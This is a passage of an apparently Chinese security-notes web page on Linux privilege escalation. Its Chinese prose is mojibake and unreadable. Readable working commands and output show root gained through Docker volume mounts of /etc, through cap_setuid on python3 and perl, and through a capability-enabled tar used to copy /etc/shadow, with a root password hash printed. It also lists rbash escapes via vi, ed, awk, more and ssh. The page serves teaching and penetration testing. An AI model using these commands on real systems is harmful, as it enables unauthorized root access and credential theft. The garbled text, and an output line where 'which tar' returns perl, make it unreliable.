<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">docker</span> run <span class="token parameter variable">-v</span> /root:/mnt <span class="token parameter variable">-it</span> alpine
<span class="token number">2</span>.è¿›å…¥/mntç›®å½•å³å¯æŸ¥çœ‹åˆ°rootç”¨æˆ·çš„å®¶ç›®å½•
/mnt <span class="token comment"># ls</span>
<span class="token number">123</span>                   bendi
anaconda-ks.cfg       initial-setup-ks.cfg

é€šè¿‡æŒ‚è½½etcç›®å½•å¯å®ç°ä¿®æ”¹shadowã€passwdç­‰æ–‡ä»¶å†…å®¹ï¼Œå¯ç›´æ¥å°†passwdæ–‡ä»¶ä¸­æ™®é€šç”¨æˆ·çš„æƒé™æ”¹ä¸º0:0å³ä¸ºrootæƒé™ã€‚
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">docker</span> run <span class="token parameter variable">-v</span> /etc:/mnt <span class="token parameter variable">-it</span> alpine
/ <span class="token comment"># cd /mnt/</span>
/ <span class="token comment"># ls</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="capcabilityææƒ" tabindex="-1"><a class="header-anchor" href="#capcabilityææƒ" aria-hidden="true">#</a> capcabilityææƒ</h4><ul><li><p>capabilityç¿»è¯‘ä¸ºèƒ½åŠ›çš„æ„æ€ï¼Œlinuxä¸­èƒ½åŠ›çš„æ¦‚å¿µå’Œsuidç±»ä¼¼ï¼Œæ˜¯ç”¨æ¥è®©æ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥åšè¶…çº§ç”¨æˆ·çš„å·¥ä½œï¼Œä»è€Œè®¾ç½®çš„ä¸€ä¸ªæœºåˆ¶ã€‚</p></li><li><p>capabilityå’Œsuidçš„åŒºåˆ«åœ¨äºï¼šsuidæ˜¯é’ˆå¯¹æŸä¸ªç”¨æˆ·ç»™æƒé™ï¼Œè€Œcapabilityé’ˆå¯¹çš„æ˜¯æŸä¸ªç¨‹åºã€‚</p></li><li><p>capabilityå¯åˆ†å‰²rootæƒé™ï¼ŒæŠŠrootç‰¹æƒåˆ†å‰²æˆä¸åŒçš„èƒ½åŠ›ï¼Œç„¶åç»™ä¸æ™®é€šç”¨æˆ·ä¸åŒçš„èƒ½åŠ›ï¼Œæ¯ä¸€ç§èƒ½åŠ›éƒ½ä»£è¡¨ç€ä¸€ç§ç‰¹æƒã€‚ä¸‹é¢æ˜¯ä¸€äº›èƒ½åŠ›å‚è€ƒï¼š</p><ul><li><p>- CAP_CHOWN:ä¿®æ”¹æ–‡ä»¶å±ä¸»çš„æƒé™</p><p>- CAP_DAC_OVERRIDE:å¿½ç•¥æ–‡ä»¶çš„DACè®¿é—®é™åˆ¶</p><p>- CAP_DAC_READ_SEARCH:å¿½ç•¥æ–‡ä»¶è¯»åŠç›®å½•æœç´¢çš„DACè®¿é—®é™åˆ¶</p><p>- CAP_FOWNERï¼šå¿½ç•¥æ–‡ä»¶å±ä¸»IDå¿…é¡»å’Œè¿›ç¨‹ç”¨æˆ·IDç›¸åŒ¹é…çš„é™åˆ¶</p><p>- CAP_FSETID:å…è®¸è®¾ç½®æ–‡ä»¶çš„setuidä½</p><p>- CAP_KILL:å…è®¸å¯¹ä¸å±äºè‡ªå·±çš„è¿›ç¨‹å‘é€ä¿¡å·</p><p>- CAP_SETGID:å…è®¸æ”¹å˜è¿›ç¨‹çš„ç»„ID</p><p>- CAP_SETUID:å…è®¸æ”¹å˜è¿›ç¨‹çš„ç”¨æˆ·ID</p><p>- CAP_SETPCAP:å…è®¸å‘å…¶ä»–è¿›ç¨‹è½¬ç§»èƒ½åŠ›ä»¥åŠåˆ é™¤å…¶ä»–è¿›ç¨‹çš„èƒ½åŠ›</p><p>- CAP_LINUX_IMMUTABLE:å…è®¸ä¿®æ”¹æ–‡ä»¶çš„IMMUTABLEå’ŒAPPENDå±æ€§æ ‡å¿—</p><p>- CAP_NET_BIND_SERVICE:å…è®¸ç»‘å®šåˆ°å°äº1024çš„ç«¯å£</p><p>- CAP_NET_BROADCAST:å…è®¸ç½‘ç»œå¹¿æ’­å’Œå¤šæ’­è®¿é—®</p><p>- CAP_NET_ADMIN:å…è®¸æ‰§è¡Œç½‘ç»œç®¡ç†ä»»åŠ¡</p><p>- CAP_NET_RAW:å…è®¸ä½¿ç”¨åŸå§‹å¥—æ¥å­—</p><p>- CAP_IPC_LOCK:å…è®¸é”å®šå…±äº«å†…å­˜ç‰‡æ®µ</p><p>- CAP_IPC_OWNER:å¿½ç•¥IPCæ‰€æœ‰æƒæ£€æŸ¥</p><p>- CAP_SYS_MODULE:å…è®¸æ’å…¥å’Œåˆ é™¤å†…æ ¸æ¨¡å—</p><p>- CAP_SYS_RAWIO:å…è®¸ç›´æ¥è®¿é—®/devport,/dev/mem,/dev/kmemåŠåŸå§‹å—è®¾å¤‡</p><p>- CAP_SYS_CHROOT:å…è®¸ä½¿ç”¨chroot()ç³»ç»Ÿè°ƒç”¨</p><p>- CAP_SYS_PTRACE:å…è®¸è·Ÿè¸ªä»»ä½•è¿›ç¨‹</p><p>- CAP_SYS_PACCT:å…è®¸æ‰§è¡Œè¿›ç¨‹çš„BSDå¼å®¡è®¡</p><p>- CAP_SYS_ADMIN:å…è®¸æ‰§è¡Œç³»ç»Ÿç®¡ç†ä»»åŠ¡ï¼Œå¦‚åŠ è½½æˆ–å¸è½½æ–‡ä»¶ç³»ç»Ÿã€è®¾ç½®ç£ç›˜é…é¢ç­‰</p><p>- CAP_SYS_BOOT:å…è®¸é‡æ–°å¯åŠ¨ç³»ç»Ÿ</p><p>- CAP_SYS_NICE:å…è®¸æå‡ä¼˜å…ˆçº§åŠè®¾ç½®å…¶ä»–è¿›ç¨‹çš„ä¼˜å…ˆçº§</p><p>- CAP_SYS_RESOURCE:å¿½ç•¥èµ„æºé™åˆ¶</p><p>- CAP_SYS_TIME:å…è®¸æ”¹å˜ç³»ç»Ÿæ—¶é’Ÿ</p><p>- CAP_SYS_TTY_CONFIG:å…è®¸é…ç½®TTYè®¾å¤‡</p><p>- CAP_MKNOD:å…è®¸ä½¿ç”¨mknod()ç³»ç»Ÿè°ƒç”¨</p><p>- CAP_LEASE:å…è®¸ä¿®æ”¹æ–‡ä»¶é”çš„FL_LEASEæ ‡å¿—</p></li></ul></li><li><p>setcapå‘½ä»¤ç”¨æ¥è®¾ç½®èƒ½åŠ›ï¼Œåœ¨è®¾ç½®ç¨‹åºèƒ½åŠ›æ—¶ï¼Œæœ‰ä¸‰ä¸ªé€‰é¡¹å¯é€‰ï¼š</p><p>1.inheritableï¼Œç®€ç§°iï¼Œè¡¨ç¤ºæ˜¯å¦å¯ç»§æ‰¿ã€‚</p><p>2.permittedï¼Œç®€ç§°pï¼Œè¡¨ç¤ºæ˜¯å¦å…è®¸ä½¿ç”¨ã€‚</p><p>3.effectiveï¼Œç®€ç§°eï¼Œè¡¨ç¤ºç‰¹æƒæ˜¯å¦æœ‰æ•ˆã€‚</p></li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ä¾‹å¦‚ï¼š
setcap cap_setuid+ep /home/python3 <span class="token comment">#è¡¨ç¤ºhome/python3è¿™ä¸ªç¨‹åºæ·»åŠ äº†setuidèƒ½åŠ›ï¼Œå³æ”¹å˜è¿›ç¨‹uidçš„èƒ½åŠ›ï¼Œ+epå°±è¡¨ç¤ºèƒ½åŠ›æœ‰æ•ˆï¼Œä¸”å…è®¸ä½¿ç”¨ã€‚</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>getcatè¯»å–èƒ½åŠ›</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ä¾‹å¦‚ï¼š
getcap <span class="token parameter variable">-r</span> ./ <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null <span class="token comment">#æŸ¥çœ‹å½“å‰ç›®å½•æœ‰èƒ½åŠ›çš„ç¨‹åºã€‚</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="python3" tabindex="-1"><a class="header-anchor" href="#python3" aria-hidden="true">#</a> Python3</h5><ul><li>å½“rootç”¨æˆ·ä½¿ç”¨capabilitiesä¸ºæŸä¸ªç¨‹åºèµ‹äºˆèƒ½åŠ›ï¼Œä½†èµ‹äºˆçš„èƒ½åŠ›è¿‡å¤§åˆ™å­˜åœ¨ææƒçš„å¯èƒ½ã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>èƒŒæ™¯
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># which python3</span>
/usr/bin/python3
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># cp /usr/bin/python3 /home/test/python3</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># setcap cap_setuid+ep python3</span>

ææƒè¿‡ç¨‹
<span class="token number">1</span>.æŸ¥çœ‹èµ‹äºˆçš„èƒ½åŠ›
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ getcap <span class="token parameter variable">-r</span> ./ <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
./python3 <span class="token operator">=</span> cap_setuid+ep
<span class="token number">2</span>.é€šè¿‡pythonè°ƒç”¨uidä¸º0çš„bash
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ./python3 <span class="token parameter variable">-c</span> <span class="token string">&#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="perl-1" tabindex="-1"><a class="header-anchor" href="#perl-1" aria-hidden="true">#</a> perl</h5><ul><li>åŒç†</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>èƒŒæ™¯
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># which perl</span>
/usr/bin/perl
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># cp /usr/bin/perl ./perl</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># setcap cap_setuid+ep perl</span>

ææƒè¿‡ç¨‹
<span class="token number">1</span>.æŸ¥çœ‹èµ‹äºˆçš„èƒ½åŠ›
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ getcap <span class="token parameter variable">-r</span> ./ <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
./perl <span class="token operator">=</span> cap_setuid+ep
<span class="token number">2</span>.é€šè¿‡perlè°ƒç”¨uidä¸º0çš„bash
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ./perl <span class="token parameter variable">-e</span> <span class="token string">&#39;use POSIX (setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#39;</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="tar" tabindex="-1"><a class="header-anchor" href="#tar" aria-hidden="true">#</a> tar</h5><ul><li>åŒç†ï¼Œä½†è¯¥å‘½ä»¤æ— æ³•ç›´æ¥è°ƒç”¨bashï¼Œä½†å¯ä»¥é€šè¿‡å‹ç¼©shadowæ–‡ä»¶æ¥ç ´è§£shadowå¯†ç ã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>èƒŒæ™¯
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># which tar</span>
/usr/bin/perl
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># cp /usr/bin/tar ./tar</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># setcap cap_dac_read_search+ep tar</span>

ææƒè¿‡ç¨‹
<span class="token number">1</span>.æŸ¥çœ‹èµ‹äºˆçš„èƒ½åŠ›
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ getcap <span class="token parameter variable">-r</span> ./ <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
./tar <span class="token operator">=</span> cap_dac_read_search+ep
<span class="token number">2</span>.å°†/etc/shadowæ–‡ä»¶å‹ç¼©åˆ°å½“å‰ç›®å½•ï¼Œå¹¶è§£å‹ã€‚è§£å‹åshadowæ–‡ä»¶æ²¡æœ‰ä»»ä½•æƒé™éœ€è¦æ·»åŠ æƒé™æ‰èƒ½æ‰§è¡Œã€‚
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ./tar <span class="token parameter variable">-cvf</span> shadow.tar /etc/shadow
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ./tar <span class="token parameter variable">-xvf</span> shadow.tar
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">chmod</span> <span class="token number">777</span> etc/shadow
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> etc/shadow <span class="token operator">|</span> <span class="token function">grep</span> root
root:<span class="token variable">$6</span><span class="token variable">$rAzUs4O1gaQ2Ucpa</span><span class="token variable">$72sYgw1AjcSbRd6cnOAbzlnCIbXb</span>/KsEz7CZSsW1nG8G6Gx8xR6BGw0udsNIXl1eIxnyYbhgUuVHjgwYIM5TS/::0:99999:7:::
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="rbashç»•è¿‡" tabindex="-1"><a class="header-anchor" href="#rbashç»•è¿‡" aria-hidden="true">#</a> rbashç»•è¿‡</h4><ul><li>rbashæ˜¯Restricted bashç¼©å†™ï¼Œå³å—é™åˆ¶çš„bashã€‚ç®¡ç†å‘˜å¯é€šè¿‡æŒ‡å®šæ™®é€šç”¨æˆ·çš„bashä¸ºrbashï¼Œä»¥æ­¤æ¥é™åˆ¶ç›¸å…³æ“ä½œã€‚åœ¨rbashä¸­ï¼Œå¾ˆå¤šè¡Œä¸ºå’Œå‘½ä»¤éƒ½ä¼šè¢«å—åˆ°é™åˆ¶ã€‚</li><li>PSï¼šè¿™ç§ç¡®åˆ‡è¯´ä¸å±äºææƒï¼Œåªæ˜¯ç»•è¿‡rbashçš„é™åˆ¶ï¼Œå› ä¸ºç»•è¿‡åèº«ä»½ä¾æ—§æ˜¯å½“å‰çš„æ™®é€šè´¦æˆ·ã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ç¯å¢ƒæ­å»º
<span class="token number">1</span>.å°†testç”¨æˆ·çš„shellè®¾ç½®ä¸ºrbash
root@hzy-virtual-machine:/home/hzy<span class="token comment"># cat /etc/passwd | grep test</span>
test:x:1001:1001::/home/test:/bin/sh
root@hzy-virtual-machine:/home/hzy<span class="token comment"># usermod -s /bin/rbash test</span>
root@hzy-virtual-machine:/home/hzy<span class="token comment"># cat /etc/passwd | grep test</span>
test:x:1001:1001::/home/test:/bin/rbash
test@hzy-virtual-machine:/home/hzy$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$SHELL</span>
/bin/rbash
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="viç»•è¿‡" tabindex="-1"><a class="header-anchor" href="#viç»•è¿‡" aria-hidden="true">#</a> viç»•è¿‡</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ç»•è¿‡è¿‡ç¨‹ï¼š
<span class="token function">vi</span>
:set <span class="token assign-left variable">shell</span><span class="token operator">=</span>/bin/sh
:shell
<span class="token builtin class-name">cd</span> /etc
<span class="token builtin class-name">pwd</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="edç»•è¿‡" tabindex="-1"><a class="header-anchor" href="#edç»•è¿‡" aria-hidden="true">#</a> edç»•è¿‡</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ç»•è¿‡è¿‡ç¨‹ï¼š
test@hzy-virtual-machine:/home/hzy$ ed
<span class="token operator">!</span><span class="token string">&#39;/bin/sh&#39;</span>
$ <span class="token builtin class-name">pwd</span>
/home/hzy
$ <span class="token builtin class-name">cd</span> /etc
$ <span class="token builtin class-name">pwd</span>
/etc
$
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="shã€bashã€dashç»•è¿‡" tabindex="-1"><a class="header-anchor" href="#shã€bashã€dashç»•è¿‡" aria-hidden="true">#</a> shã€bashã€dashç»•è¿‡</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ç»•è¿‡è¿‡ç¨‹ï¼š
ç›´æ¥è¾“å…¥shã€bashã€dashè°ƒå‡ºå‘½ä»¤è¡Œ
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="pythonã€perlç»•è¿‡" tabindex="-1"><a class="header-anchor" href="#pythonã€perlç»•è¿‡" aria-hidden="true">#</a> pythonã€perlç»•è¿‡</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>test@hzy-virtual-machine:/home/hzy$ python3 <span class="token parameter variable">-c</span> <span class="token string">&#39;import os; os.system(&quot;/bin/sh&quot;);&#39;</span>

test@hzy-virtual-machine:/home/hzy$ perl <span class="token parameter variable">-e</span> <span class="token string">&#39;system(&quot;/bin/sh&quot;);&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="awkç»•è¿‡" tabindex="-1"><a class="header-anchor" href="#awkç»•è¿‡" aria-hidden="true">#</a> awkç»•è¿‡</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>test@hzy-virtual-machine:/home/hzy$ <span class="token function">awk</span> <span class="token string">&#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="moreç»•è¿‡" tabindex="-1"><a class="header-anchor" href="#moreç»•è¿‡" aria-hidden="true">#</a> moreç»•è¿‡</h5><ul><li>å¿…é¡»å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶å¯è¯»ï¼Œæœ‰æƒé™è¯»ï¼Œè¿˜æœ‰æœ‰ç¿»é¡µåŠŸèƒ½æ‰è¡Œã€‚</li><li>ç±»ä¼¼åƒmoreçš„å‘½ä»¤å¦‚lessã€manç­‰ã€‚</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>more .bashrc
!&#39;sh&#39;
cd /
pwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="sshç™»å½•ç»•è¿‡" tabindex="-1"><a class="header-anchor" href="#sshç™»å½•ç»•è¿‡" aria-hidden="true">#</a> sshç™»å½•ç»•è¿‡</h5><ul><li>sshè¿›è¡Œè¿œç¨‹ç™»å½•æ—¶ï¼Œå¯é€šè¿‡tå‚æ•°æ¥å¼ºåˆ¶åˆ†é…ç»™è‡ªå·±ä¼ªç»ˆç«¯ï¼ŒæŒ‡å®šå¼ºåˆ¶åˆ†é…ç»™è‡ªå·±bashï¼Œç„¶åæŒ‡å®š--noprofileå‚æ•°ã€‚bashé»˜è®¤å…è®¸æ—¶ä¼šè°ƒç”¨å½“å‰ç”¨æˆ·çš„bashrcç­‰é…ç½®ï¼Œè¯¥å‚æ•°æ·»åŠ åï¼Œbashå¯åŠ¨ä¸ä¼šè¯»å–å½“å‰ç”¨æˆ·çš„é»˜è®¤é…ç½®ã€‚</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>test@hzy-virtual-machine:/home/hzy$ ssh test@192.168.0.142 -t &quot;bash --noprofile&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></div><!----><footer class="page-meta"><!----><div class="meta-item git-info"><!----><!----></div></footer><nav class="page-nav"><!----><a href="/IntranetSec/LinuxSec/LInux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html" class="nav-link next" aria-label="Linuxåº”æ€¥å“åº”"><div class="hint">ä¸‹ä¸€é¡µ<span class="arrow end"></span></div><div class="link">Linuxåº”æ€¥å“åº”<!----></div></a></nav><!----><!----><!--]--></main><!--]--><footer class="footer-wrapper"><div class="footer">æ²¡æƒ³å¥½æç€å…ˆ</div><div class="copyright">Copyright Â© 2023 XY</div></footer></div><!--]--><!----><!--]--></div>
    <script type="module" src="/assets/app-dd5faae6.js" defer></script>
  </body>
</html>
